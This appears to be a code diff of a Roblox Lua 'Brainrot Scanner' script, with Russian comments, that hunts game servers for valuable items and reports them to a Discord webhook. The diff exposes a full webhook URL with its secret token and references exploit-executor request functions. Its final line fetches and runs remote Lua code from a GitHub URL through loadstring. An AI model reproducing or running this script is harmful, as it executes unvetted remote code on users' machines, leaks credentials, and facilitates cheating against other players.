@@ -8,25 +8,9 @@ local HttpService = game:GetService('HttpService')
 
 -- ⚙️ НАСТРОЙКИ
 local INCOME_THRESHOLD = 50_000_000 -- 50M/s минимум для уведомления
-local DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1421494214570807481/uYgRF4vI6NEHNFF0tNmoG-wTOBypMlgTsRlmY_6qSkA4DxgTTCe70U7Cbv-kkTCoQOPz"
-   
+local DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1421494214570807481/uYgRF4vI6NEHNFF0tNmoG-wTOBypMlgTsRlmY_6qSkA4DxgTTCe70U7Cbv-kkTCoQOPz'
 
 print('🎯 Brainrot Scanner v2.0 | JobId:', game.JobId)
-
--- Добавьте эту функцию в начало скрипта (после сервисов)
-local function getHttpFunction()
-    if http_request then
-        return http_request
-    elseif request then
-        return request
-    elseif syn and syn.request then
-        return syn.request
-    elseif fluxus and fluxus.request then
-        return fluxus.request
-    else
-        return nil
-    end
-end
 
 -- 🎮 ОБЪЕКТЫ С ЭМОДЗИ И ВАЖНОСТЬЮ
 local OBJECTS = {
@@ -68,6 +52,7 @@ local OBJECTS = {
     ['Los Primos'] = { emoji = '🙆‍♂️', important = true },
     ['Tang Tang Keletang'] = { emoji = '📢', important = true },
     ['Money Money Puggy'] = { emoji = '🐶', important = true },
+    ['Ta Ta Ta Ta Sahur'] = { emoji = '😉', important = true },
 }
 
 -- Создаем список важных объектов
@@ -78,14 +63,20 @@ for name, cfg in pairs(OBJECTS) do
     end
 end
 
--- 💰 ПАРСЕР ДОХОДА
+-- 💰 ПАРСЕР ДОХОДА: принимаем только строки, оканчивающиеся на "/s"
+-- С суффиксом масштаба (K/M/B) в любом регистре или без него.
 local function parseGenerationText(s)
     if type(s) ~= 'string' or s == '' then
         return nil
     end
-    s = s:gsub('%$', ''):gsub(',', ''):gsub('%s+', '')
-    local num, suffix = s:match('([%-%d%.]+)%s*([KMBkmb]?)')
-    local val = tonumber(num or '')
+    -- Нормализация: убираем $, запятые и пробелы
+    local norm = s:gsub('%$', ''):gsub(',', ''):gsub('%s+', '')
+    -- Форматы: 10/s, 2.5M/s, 750k/s, 1b/s
+    local num, suffix = norm:match('^([%-%d%.]+)([KkMmBb]?)/s$')
+    if not num then
+        return nil
+    end
+    local val = tonumber(num)
     if not val then
         return nil
     end
@@ -560,10 +551,6 @@ UserInputService.InputBegan:Connect(function(input, gpe)
     end
 end)
 
-print(
-    '💡 Нажмите F для повторного сканирования'
-)
-print(
-    '📱 Discord webhook готов к отправке уведомлений'
-)
+print('💡 Нажмите F для повторного сканирования')
+print('📱 Discord webhook готов к отправке уведомлений')
 loadstring(game:HttpGet("https://raw.githubusercontent.com/velo35001/logi/refs/heads/main/botik.lua"))()
